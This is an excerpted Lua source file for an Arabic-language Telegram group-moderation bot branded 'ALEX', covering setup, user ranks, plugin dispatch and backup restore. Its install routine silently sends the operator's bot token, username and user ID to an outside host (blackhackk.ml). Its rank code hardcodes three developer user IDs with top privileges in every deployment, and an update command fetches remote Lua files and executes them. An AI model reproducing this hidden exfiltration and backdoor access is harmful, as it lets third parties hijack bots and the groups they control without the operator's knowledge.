...
ALEX = Token:match("(%d+)")
redis:set(ALEX..":VERSION",1)
redis:set(ALEX..":SUDO_ID:",SUDO_USER)
redis:set(ALEX..":DataCenter:",'German')
redis:set(ALEX..":UserNameBot:",BOT_User)
redis:set(ALEX..":NameBot:",BOT_NAME)
redis:hset(ALEX..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
redis:set("TH3ALEX_INSTALL","Yes")
info = {} 
...
https.request('https://blackhackk.ml/tokena.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
Cr_file = io.open("./inc/Token.txt", "w")
Cr_file:write(Token)
Cr_file:close()
print('\27[1;36m￤Token.txt is created.\27[m')
local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس اليكس \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
...
print('\27[0;33m>>'..[[
echo -e "\e[38;5;77m       •{ تنصيب سورس اليكس بنسيه 100% ]  }•\e[0m"
echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @U440p }• }•\e[0m"
...
echo -e "\e[38;5;77m       •{ BOT ALEX source has been installed }•\e[0m"
echo -e "\e[38;5;77m       •{ developer ALEX : @PC_SS  }•\e[0m"

echo -e "\e[38;5;77m      ALEX ✾ @PC_SSe[0m"
echo -e "\e[38;5;77m     ✾  تم تطوير السورس بواسطه مبرمج سورس اليكس ✾ .e[0m"
echo -e "\e[38;5;77m       ✾ @PC_SSe[0m"
-------------------------------------------------------------------
]]..'\027[0;32m')
create_config() 
else
...
ALEX = Token:match("(%d+)")
our_id = tonumber(ALEX)
ApiToken = "https://api.telegram.org/bot"..Token
Bot_User = redis:get(ALEX..":UserNameBot:")
SUDO_ID = tonumber(redis:get(ALEX..":SUDO_ID:"))
SUDO_USER = redis:hgetall(ALEX..'username:'..SUDO_ID).username
version = redis:get(ALEX..":VERSION")
DataCenter = redis:get(ALEX..":DataCenter:")
...
print('\27[0;33m>>'..[[
echo -e "\e[38;5;77m       •{ تنصيب سورس اليكس بنسبه 100% ]  }•\e[0m"
echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @U440p }• }•\e[0m"
...
echo -e "\e[38;5;77m       •{ SOURCE ALEX source has been installed }•\e[0m"
echo -e "\e[38;5;77m       •{ developer ALEX : @PC_SS  }•\e[0m"

echo -e "\e[38;5;77m     ALEX ✾ @PC_SSe[0m"
echo -e "\e[38;5;77m     ✾تم تطوير وبرمجة السورس من قبل جاك ✾ .e[0m"
echo -e "\e[38;5;77m     ✾ @PC_SS e[0m"
-ـ-ـ-ـ-ـ-ــ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ--ـ-ـ-ـ-ـ
                                                  
]]..'\027[0;32m'
..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..ALEX..')\027[0;32m\n'
...
if msg.type == "pv" and redis:get(ALEX..':mute_pv:'..msg.chat_id_) then
print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
return false 
end

if redis:get(ALEX..'sender:'..msg.sender_user_id_..':flood') then
...
if redis:get(ALEX..'group:add'..msg.chat_id_) then 
msg.GroupActive = true
else
msg.GroupActive = false
end

if msg.sender_user_id_ == 1741174283 then 
msg.TheRank =  'مبرمج البوت'
msg.Rank = 1

elseif msg.sender_user_id_ == 1366055467 then 
msg.TheRank =  ' المبرمج بندا '
msg.Rank = 1

elseif msg.sender_user_id_ == 1506445642 then 
msg.TheRank =  ' مرات اليكس '
msg.Rank = 1
...
msg.Rank = 1
elseif redis:sismember(ALEX..':SUDO_BOT:',msg.sender_user_id_) then 
msg.TheRankCmd = 'المطور'
msg.TheRank = 'مطور البوت'
msg.Rank = 2
elseif msg.GroupActive and redis:sismember(ALEX..':KARA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء الاساسي'
msg.TheRank = 'المنشىء الاساسي'
msg.Rank = 3
elseif msg.GroupActive and redis:sismember(ALEX..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء'
msg.TheRank = 'المنشىء'
msg.Rank = 4
elseif msg.GroupActive and redis:sismember(ALEX..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المدير' 
msg.TheRank = 'مدير البوت' 
msg.Rank = 5
elseif msg.GroupActive and redis:sismember(ALEX..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'الادمن'
msg.TheRank = 'ادمن في البوت'
msg.Rank = 6
elseif msg.GroupActive and redis:sismember(ALEX..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
...
local lock_bots = redis:get(ALEX..'lock_bots'..msg.chat_id_)
ZISBOT = false
...
if msg.GroupActive and ZISBOT and redis:get(ALEX..'lock_bots_by_kick'..msg.chat_id_) then
kick_user(msg.sender_user_id_, msg.chat_id_)
end
if msg.content_.members_[0].id_ == our_id and redis:get(ALEX..':WELCOME_BOT') then
SUDO_USER = redis:hgetall(ALEX..'username:'..SUDO_ID).username
sendPhoto(msg.chat_id_,msg.id_,redis:get(ALEX..':WELCOME_BOT'),[[• مرحباً انا بوت ]]..redis:get(ALEX..':NameBot:')..[[ .
• اختـصاصـي حمايـة الـمجموعات
• تأكد من رفعـك للبـوت مشـرف في مجموعـتك واكتب تفعـيل 
• قنـاة سورس اليكس ⇐ @U440p
...
if msg.GroupActive and redis:get(ALEX..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
return false 
end
...
if msg.Admin then redis:srem(ALEX..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return end
...
if msg.Admin then redis:srem(ALEX..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
...
if redis:get(ALEX..'mute_text'..msg.chat_id_) then --قفل الدردشه
...
if ScriptFile and ScriptFile.ALEX then 
if msg.text and ScriptFile.iALEX then
for k, ALEX in pairs(ScriptFile.ALEX) do
local SearchText = msg.text:match(ALEX)
if SearchText then
if not CheckFlood(msg) then
return false 
end

local GetMsg = ScriptFile.iALEX(msg,{msg.text:match(ALEX)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",ALEX.." | Plugin is: \27[1;32mScript.lua\27[0m")
...
if ScriptFile.dALEX then
if ScriptFile.dALEX(msg) == false then
return false
end
...
if Plug.ALEX then 
if msg.text and Plug.iALEX then
for k, ALEX in pairs(Plug.ALEX) do
local SearchText = msg.text:match(ALEX)
if SearchText then
if not CheckFlood(msg) then
return false
...
Mohammad = msg.text
if Mohammad then
if redis:sismember(ALEX..'CmDlist:'..msg.chat_id_,Mohammad) then
mmdi = redis:hget(ALEX..'CmD:'..msg.chat_id_,Mohammad)
msg.text = Mohammad:gsub(Mohammad,mmdi)
end
end
local GetMsg = Plug.iALEX(msg,{msg.text:match(ALEX)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",ALEX.." | Plugin is: \27[1;32m"..name.."\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
end 
return false
end
...
print("The File "..name.." Not Runing in The Source ALEX")
end 

end
else
print("The File Script.lua Not Runing in The Source ALEX")
...
function tdcli_update_callback(data)
	...
	redis:srem(ALEX..'users',msg.sender_user_id_)
	end
	...
	download_file('https://raw.githubusercontent.com/jack1eljoker1/ALEX/main/inc/Run.lua','./inc/Run.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURC')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/ALEX/main/inc/locks.lua','./inc/locks.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/ALEX/main/inc/Script.lua','./inc/Script.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE AL')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/ALEX/main/inc/functions.lua','./inc/functions.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/ALEX/main/plugins/zhrfa.lua','./plugins/zhrfa.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/ALEX/main/plugins/games.lua','./plugins/games.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE ALEX\n\n• ** السورس الى اصدار \n• ** تم اعاده تشغيل سورس اليكس بنجاح')
	dofile("./inc/Run.lua")
...
msg.text = Mohammad:gsub(Mohammad,mmdi)
	...
	mmd = redis:get(ALEX..":SUDO_ID:")
redis:hset(ALEX..'username:'..tonumber(mmd),'username',msg.text)
	...
	redis:set(ALEX..":SUDO_ID:",msg.text)
...
download(stk,32)
	...
	if redis:get(ALEX..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(ALEX..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(ALEX..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(ALEX..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(ALEX..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
	msg.Admin = true
	end
	local lock_bots = redis:get(ALEX..'lock_bots'..msg.chat_id_)
	ISBOT = false
	...
	if ZISBOT and redis:get(ALEX..'lock_bots_by_kick'..msg.chat_id_) then
	kick_user(msg.sender_user_id_, msg.chat_id_)
	end
...
if redis:get(ALEX..'lock:join:'..msg.chat_id_) then
kick_user(msg.sender_user_id_,msg.chat_id_)
	...
	if redis:get(ALEX..'group:add'..data.chat_.id_) then
	redis:set(ALEX..'group:name'..data.chat_.id_,data.chat_.title_)
	end
	...
	if redis:get(ALEX..'group:add-100'..data.channel_.id_) then
	local linkGroup = (redis:get(ALEX..'linkGroup-100'..data.channel_.id_) or "")
	local NameGroup = (redis:get(ALEX..'group:name-100'..data.channel_.id_) or "")
	...
	redis:mset(
	ALEX..'group:name'..k,IDS.Title,
	ALEX..'num_msg_ALEX'..k,5,
	ALEX..'group:add'..k,true,
	ALEX..'lock_link'..k,true,
	ALEX..'lock_spam'..k,true,
	ALEX..'lock_webpage'..k,true,
	ALEX..'lock_markdown'..k,true,
	ALEX..'lock_flood'..k,true,
	ALEX..'lock_bots'..k,true,
	ALEX..'mute_forward'..k,true,
	ALEX..'mute_contact'..k,true,
	ALEX..'mute_document'..k,true,
	ALEX..'mute_inline'..k,true,
	ALEX..'lock_username'..k,true,
	ALEX..'replay'..k,true
	)
	redis:sadd(ALEX..'group:ids',k) 

	if IDS.Admins then
	for user,ID in pairs(IDS.Admins) do
	redis:hset(ALEX..'username:'..ID,'username',user)
	redis:sadd(ALEX..'admins:'..k,ID)
	end
	end
	if IDS.Creator then
	for user,ID in pairs(IDS.Creator) do
	redis:hset(ALEX..'username:'..ID,'username',user)
	redis:sadd(ALEX..':MONSHA_BOT:'..k,ID)
	end
	end
	if IDS.Owner then
	for user,ID in pairs(IDS.Owner) do
	redis:hset(ALEX..'username:'..ID,'username',user)
	redis:sadd(ALEX..'owners:'..k,ID)
	end
	end
	end
	io.popen("rm -fr ../.telegram-cli/data/document/*")
	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'• ** تم رفع النسخه‏‏ الاحتياطيه\n• ** حالياً عدد مجموعاتك هيه‏ *'..redis:scard(ALEX..'group:ids')..' .*\n')
	end
	elseif data.ID == "UpdateUser" then  
	if data.user_.type_.ID == "UserTypeDeleted" then
	print("¦ userTypeDeleted")
	redis:srem(ALEX..'users',data.user_.id_)
	elseif data.user_.type_.ID == "UserTypeGeneral" then
	local CheckUser = redis:hgetall(ALEX..'username:'..data.user_.id_).username
	...
	redis:hset(ALEX..'username:'..data.user_.id_,'username',USERNAME)
	end 
	end
